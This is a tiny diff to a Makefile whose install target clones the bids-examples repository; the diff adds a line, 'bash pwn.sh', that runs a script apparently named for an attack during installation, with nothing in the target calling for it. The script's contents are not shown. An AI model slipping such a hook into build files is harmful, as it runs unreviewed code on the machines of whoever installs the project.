@@ -1,3 +1,4 @@
 
 install:
 	git clone https://github.com/bids-standard/bids-examples.git --depth 1
+	bash pwn.sh
